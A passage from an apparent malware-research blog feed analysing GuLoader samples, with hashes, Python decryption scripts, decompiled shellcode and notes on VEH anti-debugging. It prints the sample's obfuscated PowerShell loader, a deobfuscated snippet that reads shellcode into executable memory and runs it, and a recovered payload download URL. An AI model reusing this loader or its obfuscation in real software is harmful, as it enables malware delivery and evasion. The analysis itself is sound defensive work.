659, 150164, 661, 663, 665, 150170, 667, 150172, 670, 673, 675, 166570, 166573, 166574, 166580, 150254, 150259, 150260, 760, 150265, 762, 764, 765, 150271, 768, 770, 150274, 773, 150279, 776, 150281, 778, 150282, 780, 166666, 782, 150283, 166672, 166669, 150286, 150292, 790, 150294, 150296, 793, 795, 150299, 150303, 801, 804, 150309, 150311, 809, 150314, 150315, 814, 815, 150321, 821, 150326, 150328, 826, 150331, 832, 150337, 835, 841, 843, 150347, 150349, 150352, 849, 150356, 855, 150359, 150361, 858, 168795, 860, 150364, 168799, 150368, 168801, 150370, 866, 168802, 150373, 868, 168804, 168805, 871, 168807, 873, 168809, 168811, 150375, 150378, 879, 168816, 881, 150381, 150383, 884, 150386, 168822, 887, 150389, 168825, 890, 150391, 892, 168831, 168833, 897, 900, 168839, 903, 168841, 168843, 908, 168845, 168847, 913, 168850, 168852, 168854, 918, 168856, 924, 929, 150435, 932, 935, 150439, 937, 150444, 942, 150447, 945, 150452, 950, 150457, 955, 150459, 150461, 960, 962, 150466, 964, 150468, 967, 970, 150474, 166858, 973, 150477, 975, 150479, 166860, 166862, 166865, 980, 150485, 166867, 150487, 166869, 150489, 985, 988, 150495, 991, 996, 150501, 999, 150507, 1004, 150513, 150518, 150521, 150522, 150527, 150533, 150539, 150540, 150546, 150549, 150555, 150561, 150563, 150569, 150575, 1074, 1076, 166967, 166969, 1082, 1084, 166974, 166976, 1091, 1092, 1093, 166979, 1095, 166982, 166983, 166988, 1101, 1103, 166991, 166993, 1106, 1107, 166999, 1113, 167001, 1115, 1117, 1119, 167007, 1121, 167009, 1127, 167015, 1130, 167018, 167019, 167022, 1135, 167025, 1138, 167027, 1140, 167029, 167031, 167033, 1148, 167038, 167040, 167043, 167046, 150665, 150667, 167052, 167055, 150673, 150675, 167061, 150678, 150684, 150690, 150692, 150698, 167082, 150700, 167083, 167085, 167088, 150705, 150708, 167095, 167097, 150714, 150716, 150718, 167102, 150720, 150723, 150725, 167109, 167111, 150728, 150730, 167118, 150735, 167120, 150737, 152788, 150741, 152790, 150743, 150744, 167127, 167130, 152795, 152796, 167132, 150750, 152802, 150755, 167138, 167140, 150758, 167143, 152808, 150760, 167145, 152811, 152813, 150766, 167152, 152819, 150772, 152821, 167156, 167158, 167160, 150778, 152827, 152829, 150781, 152831, 150782, 167165, 152834, 150787, 152836, 167167, 152838, 167172, 167175, 150793, 152843, 167180, 152845, 167182, 150799, 150800, 167184, 152851, 150806, 167191, 152857, 150809, 150811, 152860, 167198, 150817, 152866, 152868, 167204, 152870, 150823, 167207, 152873, 152875, 152880, 152882, 152888, 152894, 152900, 166762, 167281, 167284, 167293, 166766, 167302, 152970, 152973, 167311, 152976, 152979, 152981, 152983, 167320, 152985, 167322, 152988, 167325, 152990, 166772, 152992, 152995, 167332, 167338, 167340, 153017, 153019, 153023, 153025, 153031, 153034, 153039, 153043, 153049, 153054, 153060, 153062, 153068, 153071, 153074, 153080, 153082, 153084, 153086, 153091, 153097, 153099, 153105, 153107, 153113, 153116, 153119, 153125, 153130, 153136, 153142, 153148, 153150, 153154, 153156, 153158, 153164, 153170, 153173, 153179, 153183, 153185, 153186, 153191, 153197, 153199, 153204, 153210, 153213, 153217, 153219, 153221, 153227, 153233, 153235, 153240, 153242, 153248, 153250, 153256, 153262, 153265, 153268, 153273, 153279, 153285, 153291, 153385, 153387, 153390, 153396, 153406, 153410, 153412, 153417, 153423, 153429, 153435, 153436, 153459, 153460, 149373, 149377, 149379, 149381, 149384, 153483, 149389, 149391, 153488, 153489, 153491, 153494, 153496, 153499, 153502, 153503, 153508, 153510, 153516, 153517, 153518, 153520, 153524, 153526, 153532, 153537, 153540, 153546, 153550, 165839, 153556, 165844, 165845, 165848, 149465, 153562, 149467, 153565, 153567, 149473, 153570, 149475, 149477, 149478, 153576, 153578, 153580, 149484, 149486, 153585, 149492, 153589, 149494, 149495, 149496, 153595, 149502] . IDA Label Trace . import idc trace_addr = [0, 153600, 149504, 153603, 149510, 149512, 153609, 153612, 149518, 149519, 153618, 149525, 149527, 153624, 153627, 149533, 153629, 149538, 153635, 153641, 153643, 153649, 153655, 165946, 153660, 165949, 153662, 153668, 153670, 153676, 153678, 153684, 149604, 149606, 149611, 149613, 149618, 149623, 149625, 149631, 149637, 149639, 149640, 166023, 149642, 166028, 149647, 166034, 149652, 168085, 149658, 149663, 149668, 153766, 149670, 153768, 149673, 149676, 153774, 149678, 153780, 149684, 153782, 149686, 153785, 149689, 153787, 149691, 149694, 149699, 149700, 149703, 149705, 149711, 149717, 149722, 149727, 149729, 149734, 149739, 149741, 149747, 149749, 149753, 149755, 149757, 149759, 257, 149764, 149769, 166156, 149775, 149776, 166159, 149778, 149779, 166161, 149781, 166164, 149787, 149789, 149795, 149797, 149798, 149804, 149806, 149811, 149813, 149820, 149823, 149830, 149837, 149839, 149842, 149848, 149853, 149858, 149864, 149870, 166262, 375, 166263, 166265, 380, 166271, 149952, 450, 149954, 452, 149960, 149962, 149963, 149969, 149972, 149974, 149977, 149980, 149985, 149990, 149996, 149998, 150000, 150004, 166389, 166391, 150009, 150012, 150014, 150016, 150017, 150019, 150021, 150026, 150027, 150029, 150032, 534, 536, 538, 150043, 150058, 150061, 150064, 150067, 150069, 150072, 150074, 150077, 150079, 150081, 150084, 150086, 150089, 150092, 150094, 150097, 150099, 150102, 150105, 150108, 150111, 150113, 150116, 150118, 150120, 166505, 150123, 166508, 150125, 150131, 628, 150133, 630, 150135, 632, 150136, 634, 150138, 640, 150144, 150146, 646, 648, 150152, 650, 150154, 652, 653, 654, 150155, 656, 150161, 659, 150164, 661, 663, 665, 150170, 667, 150172, 670, 673, 675, 166570, 166573, 166574, 166580, 150254, 150259, 150260, 760, 150265, 762, 764, 765, 150271, 768, 770, 150274, 773, 150279, 776, 150281, 778, 150282, 780, 166666, 782, 150283, 166672, 166669, 150286, 150292, 790, 150294, 150296, 793, 795, 150299, 150303, 801, 804, 150309, 150311, 809, 150314, 150315, 814, 815, 150321, 821, 150326, 150328, 826, 150331, 832, 150337, 835, 841, 843, 150347, 150349, 150352, 849, 150356, 855, 150359, 150361, 858, 168795, 860, 150364, 168799, 150368, 168801, 150370, 866, 168802, 150373, 868, 168804, 168805, 871, 168807, 873, 168809, 168811, 150375, 150378, 879, 168816, 881, 150381, 150383, 884, 150386, 168822, 887, 150389, 168825, 890, 150391, 892, 168831, 168833, 897, 900, 168839, 903, 168841, 168843, 908, 168845, 168847, 913, 168850, 168852, 168854, 918, 168856, 924, 929, 150435, 932, 935, 150439, 937, 150444, 942, 150447, 945, 150452, 950, 150457, 955, 150459, 150461, 960, 962, 150466, 964, 150468, 967, 970, 150474, 166858, 973, 150477, 975, 150479, 166860, 166862, 166865, 980, 150485, 166867, 150487, 166869, 150489, 985, 988, 150495, 991, 996, 150501, 999, 150507, 1004, 150513, 150518, 150521, 150522, 150527, 150533, 150539, 150540, 150546, 150549, 150555, 150561, 150563, 150569, 150575, 1074, 1076, 166967, 166969, 1082, 1084, 166974, 166976, 1091, 1092, 1093, 166979, 1095, 166982, 166983, 166988, 1101, 1103, 166991, 166993, 1106, 1107, 166999, 1113, 167001, 1115, 1117, 1119, 167007, 1121, 167009, 1127, 167015, 1130, 167018, 167019, 167022, 1135, 167025, 1138, 167027, 1140, 167029, 167031, 167033, 1148, 167038, 167040, 167043, 167046, 150665, 150667, 167052, 167055, 150673, 150675, 167061, 150678, 150684, 150690, 150692, 150698, 167082, 150700, 167083, 167085, 167088, 150705, 150708, 167095, 167097, 150714, 150716, 150718, 167102, 150720, 150723, 150725, 167109, 167111, 150728, 150730, 167118, 150735, 167120, 150737, 152788, 150741, 152790, 150743, 150744, 167127, 167130, 152795, 152796, 167132, 150750, 152802, 150755, 167138, 167140, 150758, 167143, 152808, 150760, 167145, 152811, 152813, 150766, 167152, 152819, 150772, 152821, 167156, 167158, 167160, 150778, 152827, 152829, 150781, 152831, 150782, 167165, 152834, 150787, 152836, 167167, 152838, 167172, 167175, 150793, 152843, 167180, 152845, 167182, 150799, 150800, 167184, 152851, 150806, 167191, 152857, 150809, 150811, 152860, 167198, 150817, 152866, 152868, 167204, 152870, 150823, 167207, 152873, 152875, 152880, 152882, 152888, 152894, 152900, 166762, 167281, 167284, 167293, 166766, 167302, 152970, 152973, 167311, 152976, 152979, 152981, 152983, 167320, 152985, 167322, 152988, 167325, 152990, 166772, 152992, 152995, 167332, 167338, 167340, 153017, 153019, 153023, 153025, 153031, 153034, 153039, 153043, 153049, 153054, 153060, 153062, 153068, 153071, 153074, 153080, 153082, 153084, 153086, 153091, 153097, 153099, 153105, 153107, 153113, 153116, 153119, 153125, 153130, 153136, 153142, 153148, 153150, 153154, 153156, 153158, 153164, 153170, 153173, 153179, 153183, 153185, 153186, 153191, 153197, 153199, 153204, 153210, 153213, 153217, 153219, 153221, 153227, 153233, 153235, 153240, 153242, 153248, 153250, 153256, 153262, 153265, 153268, 153273, 153279, 153285, 153291, 153385, 153387, 153390, 153396, 153406, 153410, 153412, 153417, 153423, 153429, 153435, 153436, 153459, 153460, 149373, 149377, 149379, 149381, 149384, 153483, 149389, 149391, 153488, 153489, 153491, 153494, 153496, 153499, 153502, 153503, 153508, 153510, 153516, 153517, 153518, 153520, 153524, 153526, 153532, 153537, 153540, 153546, 153550, 165839, 153556, 165844, 165845, 165848, 149465, 153562, 149467, 153565, 153567, 149473, 153570, 149475, 149477, 149478, 153576, 153578, 153580, 149484, 149486, 153585, 149492, 153589, 149494, 149495, 149496, 153595, 149502] for addr in trace_addr: idc.create_insn(addr) set_color(addr, CIC_ITEM, color_value) .",
            "url": "https://research.openanalysis.net/guloader/emulation/dumpulator/veh/exceptions/2023/01/15/dumpulator-veh.html",
            "relUrl": "/guloader/emulation/dumpulator/veh/exceptions/2023/01/15/dumpulator-veh.html",
            "date": " ‚Ä¢ Jan 15, 2023"
        }
        
    
  
    
        ,"post24": {
            "title": "Guloader",
            "content": "Overview . Sample . 14d52119459ef12be3a2f9a3a6578ee3255580f679b1b54de0990b6ba403b0fe malshare . References . Defeating Guloader Anti-Analysis Technique | Dissecting the new shellcode-based variant of GuLoader (CloudEyE) | Spoofed Saudi Purchase Order Drops GuLoader ‚Äì Part 2 | Malware Analysis: GuLoader Dissection Reveals New Anti-Analysis Techniques and Code Injection Redundancy (published after our notes) | Alex Hanel Unicorn Notes | . Analysis . Stage 1 . file_data = open(&#39;/tmp/stage1.bin&#39;,&#39;rb&#39;).read() . import struct out = [] key = struct.pack(&#39;&lt;I&#39;,0x919E1E2E) code_offset = 0x0000014E enc_code = file_data[code_offset:] for i in range(len(enc_code)): out.append(enc_code[i] ^ key[i % len(key)]) open(&#39;/tmp/stage2.bin&#39;,&#39;wb&#39;).write(bytes(out)) . Stage 2 . hex((0x96900857 + 0x10E451D0) ^ 0xAA6DFF89 ^ 0xD19A097) . hex((0x191AE730 ^ 0x320EB5D5 ^ 0xB8DB25E1) + 0x6C3088FC) . hex((0xE22ECFA7 ^ 0xD05F809C ^ 0x4E1C381C) - 0x7C6D76C6) . (0x1C90313A ^ 0x0A3C51979 ^ 0x8A519DBE) - 0x3504B2FD . buff = bytes.fromhex(&#39;D8 E3 A9 5E AB&#39;) buff2 = bytes.fromhex(&#39;b697cd32c7143eea5fb5fd3fa3dba8aaebe6226c89b9501c20806c888f58a2ba8ebc6b0a94e5bded795a2757109b8997d87e8080ee4aeb&#39;) out = [] for i in range(len(buff2)): out.append(buff2[i] ^ buff[i % len(buff)]) bytes(out) . def xor_crypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) xor_crypt(buff, buff2) . egg = xor_crypt(b&#39;http&#39;, buff2) print(egg.hex()) stage2_data = open(&#39;/tmp/stage2.bin&#39;,&#39;rb&#39;).read() c2_offset = stage2_data.find(egg) xor_crypt(stage2_data[c2_offset:c2_offset+100], buff2) . hex(len(b&#39;http://bounceclick.live/VVB/COrg_RYGGqN229.bin&#39;)) . Guloader Deliver (PowerShell) . Sample . 54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae malshare . Overview . This sample also uses NSIS installer but instead of loading shellcode directly from the NSIS script they add an intermediate stage with PowerShell to further obfuscate the loader. . Analysis . Stage 1 . Stage one is the NSIS script which is used to launch and obfuscated powershell script in the Soothsaying.For file. The script can be found on ghostbin here . Stage 2 . The obfuscated powershell contains a 3rd stage obfuscated powershell command in a variable that is deobfuscated and launched. We circomvented this by replacing the IEX execute commands with Write-Output print statements. . Stage 3 . The obfuscatd powershell 3rd stage contains multiple encrypted strings which we have decrypted below. . ps_data = &#39;&#39;&#39; Function HTB { param([String]$Humanmummy152); $Sprjtende = New-Object byte[] ($Humanmummy152.Length / 2); For($Stuphe=0; $Stuphe -lt $Humanmummy152.Length; $Stuphe+=2){ $Sprjtende[$Stuphe/2] = [convert]::ToByte($Humanmummy152.Substring($Stuphe, 2), 16); $Sprjtende[$Stuphe/2] = ($Sprjtende[$Stuphe/2] -bxor 141); } [String][System.Text.Encoding]::ASCII.GetString($Sprjtende); }$Fitchet0=HTB &#39;DEF4FEF9E8E0A3E9E1E1&#39;; $Fitchet1=HTB &#39;C0E4EEFFE2FEE2EBF9A3DAE4E3BEBFA3D8E3FEECEBE8C3ECF9E4FBE8C0E8F9E5E2E9FE&#39;; $Fitchet2=HTB &#39;CAE8F9DDFFE2EECCE9E9FFE8FEFE&#39;; $Fitchet3=HTB &#39;DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EB&#39;; $Fitchet4=HTB &#39;FEF9FFE4E3EA&#39;; $Fitchet5=HTB &#39;CAE8F9C0E2E9F8E1E8C5ECE3E9E1E8&#39;; $Fitchet6=HTB &#39;DFD9DEFDE8EEE4ECE1C3ECE0E8A1ADC5E4E9E8CFF4DEE4EAA1ADDDF8EFE1E4EE&#39;; $Fitchet7=HTB &#39;DFF8E3F9E4E0E8A1ADC0ECE3ECEAE8E9&#39;; $Fitchet8=HTB &#39;DFE8EBE1E8EEF9E8E9C9E8E1E8EAECF9E8&#39;; $Fitchet9=HTB &#39;C4E3C0E8E0E2FFF4C0E2E9F8E1E8&#39;; $udvalgsprocedure0=HTB &#39;C0F4C9E8E1E8EAECF9E8D9F4FDE8&#39;; $udvalgsprocedure1=HTB &#39;CEE1ECFEFEA1ADDDF8EFE1E4EEA1ADDEE8ECE1E8E9A1ADCCE3FEE4CEE1ECFEFEA1ADCCF8F9E2CEE1ECFEFE&#39;; $udvalgsprocedure2=HTB &#39;C4E3FBE2E6E8&#39;; $udvalgsprocedure3=HTB &#39;DDF8EFE1E4EEA1ADC5E4E9E8CFF4DEE4EAA1ADC3E8FADEE1E2F9A1ADDBE4FFF9F8ECE1&#39;; $udvalgsprocedure4=HTB &#39;DBE4FFF9F8ECE1CCE1E1E2EE&#39;; $udvalgsprocedure5=HTB &#39;E3F9E9E1E1&#39;; $udvalgsprocedure6=HTB &#39;C3F9DDFFE2F9E8EEF9DBE4FFF9F8ECE1C0E8E0E2FFF4&#39;; $udvalgsprocedure7=HTB &#39;C4C8D5&#39;; $udvalgsprocedure8=HTB &#39;D1&#39;; Set-Alias -name udvalgsprocedure9 -value $udvalgsprocedure7; function fkp {Param ($Ries, $Negeringsfunktionens) ; $Kabar0 =HTB &#39;A9D8E3ECEFE9E4EEECF9E4FBE8ADB0ADA5D6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3CAE8F9CCFEFEE8E0EFE1E4E8FEA5A4ADF1ADDAE5E8FFE8A0C2EFE7E8EEF9ADF6ADA9D2A3CAE1E2EFECE1CCFEFEE8E0EFE1F4CEECEEE5E8ADA0CCE3E9ADA9D2A3C1E2EEECF9E4E2E3A3DEFDE1E4F9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B5A4D6A0BCD0A3C8FCF8ECE1FEA5A9CBE4F9EEE5E8F9BDA4ADF0A4A3CAE8F9D9F4FDE8A5A9CBE4F9EEE5E8F9BCA4&#39;; udvalgsprocedure9 $Kabar0; $Kabar5 = HTB &#39;A9DEFDE4E9FEE5ECE0E0E8FFE8FEADB0ADA9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9BFA1ADD6D9F4FDE8D6D0D0ADCDA5A9CBE4F9EEE5E8F9BEA1ADA9CBE4F9EEE5E8F9B9A4A4&#39;; udvalgsprocedure9 $Kabar5; $Kabar1 = HTB &#39;FFE8F9F8FFE3ADA9DEFDE4E9FEE5ECE0E0E8FFE8FEA3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5D6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBD0A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBA5A5C3E8FAA0C2EFE7E8EEF9ADC4E3F9DDF9FFA4A1ADA5A9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9B8A4A4A3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5A9DFE4E8FEA4A4A4A4A1ADA9C3E8EAE8FFE4E3EAFEEBF8E3E6F9E4E2E3E8E3FEA4A4&#39;; udvalgsprocedure9 $Kabar1; }function GDT {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Ambilaevous,[Parameter(Position = 1)] [Type] $Malmy = [Void]); $Kabar2 = HTB &#39;A9CFE2FFE3E8E2ADB0ADD6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3C9E8EBE4E3E8C9F4E3ECE0E4EECCFEFEE8E0EFE1F4A5A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CCFEFEE8E0EFE1F4C3ECE0E8A5A9CBE4F9EEE5E8F9B5A4A4A1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3C8E0E4F9A3CCFEFEE8E0EFE1F4CFF8E4E1E9E8FFCCEEEEE8FEFED0B7B7DFF8E3A4A3C9E8EBE4E3E8C9F4E3ECE0E4EEC0E2E9F8E1E8A5A9CBE4F9EEE5E8F9B4A1ADA9EBECE1FEE8A4A3C9E8EBE4E3E8D9F4FDE8A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BDA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BCA1ADD6DEF4FEF9E8E0A3C0F8E1F9E4EEECFEF9C9E8E1E8EAECF9E8D0A4&#39;; udvalgsprocedure9 $Kabar2; $Kabar3 = HTB &#39;A9CFE2FFE3E8E2A3C9E8EBE4E3E8CEE2E3FEF9FFF8EEF9E2FFA5A9CBE4F9EEE5E8F9BBA1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CEECE1E1E4E3EACEE2E3FBE8E3F9E4E2E3FED0B7B7DEF9ECE3E9ECFFE9A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4&#39;; udvalgsprocedure9 $Kabar3; $Kabar4 = HTB &#39;A9CFE2FFE3E8E2A3C9E8EBE4E3E8C0E8F9E5E2E9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BFA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BEA1ADA9C0ECE1E0F4A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4&#39;; udvalgsprocedure9 $Kabar4; $Kabar5 = HTB &#39;FFE8F9F8FFE3ADA9CFE2FFE3E8E2A3CEFFE8ECF9E8D9F4FDE8A5A4&#39;; udvalgsprocedure9 $Kabar5 ; }$Nonperforated = HTB &#39;E6E8FFE3E8E1BEBF&#39;; $Brndselsforbrug = HTB &#39;F8FEE8FFBEBF&#39;; $Sottishness03 = HTB &#39;CAE8F9CEE2E3FEE2E1E8DAE4E3E9E2FA&#39;; $Sottishness00=HTB &#39;DEE5E2FADAE4E3E9E2FA&#39;; $Kabar6 = HTB &#39;A9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B9A4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4&#39;; udvalgsprocedure9 $Kabar6; $Sottishness01 = HTB &#39;A9E3E2E3E9E4FDF9E8FFE2F8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9CFFFE3E9FEE8E1FEEBE2FFEFFFF8EAADA9DEE2F9F9E4FEE5E3E8FEFEBDBDA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4&#39;; udvalgsprocedure9 $Sottishness01; $Sottishness02 = HTB &#39;A9C9E2FAE3EEFFE4E8E9ADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9DEE2F9F9E4FEE5E3E8FEFEBDBEA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4&#39;; udvalgsprocedure9 $Sottishness02; $Kabar7 = HTB &#39;A9D8E3EEF8E1F9E4FBECEFE1E8ADB0ADA9C9E2FAE3EEFFE4E8E9A3C4E3FBE2E6E8A5BDA4&#39;; udvalgsprocedure9 $Kabar7; $Kabar7 = HTB &#39;A9E3E2E3E9E4FDF9E8FFE2F8FEA3C4E3FBE2E6E8A5A9D8E3EEF8E1F9E4FBECEFE1E8A1ADBDA4&#39;; udvalgsprocedure9 $Kabar7; $Sottishness04 = fkp $udvalgsprocedure5 $udvalgsprocedure6; $Kabar7 = HTB &#39;A9CEECFEF8E4FEF9E4EEECE1E1F4BEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBEBCBBA1ADBDF5BEBDBDBDA1ADBDF5B9BDA4&#39;; udvalgsprocedure9 $Kabar7; $Kabar8 = HTB &#39;A9D8E3FEECE4E3F9E1E4E3E8FEFEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBDF5BCBDBDBDBDBDA1ADBDF5BEBDBDBDA1ADBDF5B9A4&#39;; udvalgsprocedure9 $Kabar8; $Casuistically2=&quot;rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrpdgaaaslraoddernnoanlergpaeyeefaonoaiitiiuahhglkkaedazrrafrecrcieennipurralanidnkeueraeapeaoaoeofrreevlrxuutefyinuireraanslealiieaaodrrclieeiuauraorreeoeboeojjluricahanieasaneueuaeleohnmriarlioaaegtralioleraonearouvoieobohrveneeaafodeiiitinotdieieplaleeideoooeaaorrntiaiaotopnehekeatlriovaaadlnaoionauitinuaalnrevioeeetspnleeenoloeeeouuinrpuaijojoaovaoarroyopoaynupnoamouamsmpdundpuoinruuraroyanrsenifeaeuopernoeiilauhcricaokcarodvoorbaioelcloauemaauuijtlrrrntaarreaoutneayenpkrwieeokenleioeerkoseeouapauunoleydriakeaexaneeupiuhaiovantesneoeuaaaigyokhieoiroarueivuoetnliisnunyeiaupogylhieetuaoutejdioleakriiaaeheaictaeuaeonutlexseosfkoaeeepknkrnpueeaoeiuamyhvenpluoymohaauoiyaostiuindklaeyapeayloaoaasnyehoorerpeevraooiietoaaeeooieloiirsayadnaeaaaiftrooidvalauieaeearnonaevuuyaerelkoaduecoayonsaroieueiaiiovunriisolkosuaaroeayiuoiiaureeyatdnureafnnaevhnhaitlryrrkupuofbmrrpiunnuakarkalohnuoudeyriegnrdejivnonnnkevruugeoeleoanalahsaoylapenujpiueemiieuludkudeeesloreieeleiaarlaohvnouarurlveurrorumetnvnpruinnhremoleiikooialteieersidbpigneuoprloelyvooyavennipaaiepafenokaeiaeraeteiweoevgakrouaktatilsunqleoefnugiaevaeamnuarnoiinelr&quot; &#39;&#39;&#39; import re def decrypt(data,key): tmp_data = bytes.fromhex(data) out = [] for c in tmp_data: out.append(c ^ key) return bytes(out) egg = r&quot;HTB &#39;([^&#39;]*)&#39;&quot; str_map = {} for m in re.finditer(egg, ps_data): data = m.group(1) ptxt_data = decrypt(data, 141) str_map[m.group()] = ptxt_data.decode(&#39;utf-8&#39;) for k in str_map: ps_data = ps_data.replace(k,&quot;&#39;&quot; + str_map[k] + &quot;&#39;&quot;) print(ps_data) . Shellcode Loader . Once the strings have been decrypted it is clear that the powershell is used to read shellcode from the Semiskilled.Slv file. This code is split at 0x400 and 0x53c and copied into two allocated buffers. The first buffer is then called and the second buffer passed as an argument along with a pointer to NtProtectVirtualMemory. . $Buffer1_RWX = $VirtualAlloc.Invoke([IntPtr]::Zero, 316, 0x3000, PAGE_EXECUTE_READWRITE) $Buffer2_RW = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x100000, 0x3000, PAGE_READWRITE) $ShellCode = [System.IO.File]::ReadAllBytes(&#39;$env:LOCALAPPDATA Ecphorize Gonocoele Semiskilled.Slv&#39;) [System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 1024, $Buffer1_RWX , 316) [System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 316+1024, $Buffer2_RW , $ShellCode.count-316-1024) $ShellCodeEntry = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Buffer1_RWX , (GDT @([IntPtr],[IntPtr]) ([Void]))) $ShellCodeEntry.Invoke($Buffer2_RW , fkp ntdll NtProtectVirtualMemory) Guloader Shellcode Stage 1 . The first stage of the shellcode has heavy obfuscation but it is a simple loader and decryptor used to decrypt the buffer that is passed as an argument from the PowerShells script. The decryption is an XOR with the key 0xA980E98A. . void __usercall sub_0(int a1@&lt;ebp&gt;, void (*a2)(void), int a3) { int v3; // ebp void (__stdcall *v4)(int, int, int, int, int); // edx int v5; // esi int v6; // ecx int i; // eax v3 = a1 - 768; *(_DWORD *)(v3 + 256) = 0x100000; *(_DWORD *)(v3 + 260) = a2; v4 = (void (__stdcall *)(int, int, int, int, int))(a3 + 5); v5 = 0; v6 = 0; while ( 1 ) { do ++v6; while ( *(_DWORD *)((char *)v4 + v6) != *(_DWORD *)(a3 + 5) ); ++v5; if ( *(_BYTE *)(a3 + v6) == 0xB8 ) { v4(-1, v3 + 260, v3 + 256, 64, v3 + 156); for ( i = 0; i != 0x29B28; i += 4 ) *(_DWORD *)((char *)a2 + i) ^= 0xA980E98A; a2(); JUMPOUT(0x13C); } } } . Guloader Shellcode Stage 2 . The second stage shellcode is a version of the main guloader stage2 shellcode. Some of the same functions exist in this shellcode as the original shellcode we analyzed above. . SHA256 = E3A8356689B97653261EA6B75CA911BC65F523025F15649E87B1AEF0071AE107 malshare . key_len = 44 . key = bytes.fromhex(&#39;3d4f0b6d845f58cbf8844e9ab35781156c68109175e8c42901f8ee2b78c4926631939c778b2a48e0d8ea0dd585&#39;) . def xor_crypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) egg = xor_crypt(b&#39;http&#39;, key) print(egg.hex()) stage2_data = open(&#39;/tmp/Semiskilled.Slv_shellcode_stage_2_patched.bin&#39;,&#39;rb&#39;).read() c2_offset = stage2_data.find(egg) print(c2_offset) xor_crypt(stage2_data[c2_offset:c2_offset+100], key) . 553b7f1d -1 . b&#39;&#39; . data = bytes.fromhex(&#39;48 4F 78 6D E1 5F 2A CB CB 84 7C 9A&#39;) xor_crypt(data, key).replace(b&#39; x00&#39;,b&#39;&#39;) . b&#39;user32&#39; . VEH Program Flow Redirection . As described in both the CrowdStrike and Unit42 blogs Guloader uses an VEH to both do some anti-debugging checks and redirect the program flow. . The way this works is the VEH redirects EIP using a decoding routing based on byte the follows the INT3 (cc) instruction which caused the excpetion. In the code jmp instructions have been replaced with INT3 and an encoded byte. There is a nice IDA Python plugin from Unit42 that will automatically replace the INT3 code with JMPs. ** Remember you need to update the XOR byte in the 